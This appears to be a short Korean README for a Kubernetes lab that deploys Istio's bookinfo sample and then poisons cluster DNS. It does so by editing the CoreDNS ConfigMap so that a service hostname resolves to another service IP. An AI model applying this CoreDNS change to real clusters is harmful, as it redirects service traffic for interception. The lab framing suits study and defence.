# 개요
* coredns를 변조시켜 DNS posion

# 배포 방법

```sh
kubectl create ns shopping
kubectl apply -f ./book_applications.yaml -n shopping
```

# 공격 방법

* coredns를 변조

```sh
$ kubectl edit configmap coredns -n kube-system
apiVersion: v1
kind: ConfigMap
metadata:
  name: coredns
  namespace: kube-system
data:
  Corefile: |
    .:53 {
        ...
        # 아래 값을 변경해주세요
        hosts {
          {k8s sevrice IP} detail.default.svc.cluster.local
          fallthrough
        }
```

# 참고자료
* istio: https://istio.io/latest/docs/examples/bookinfo/
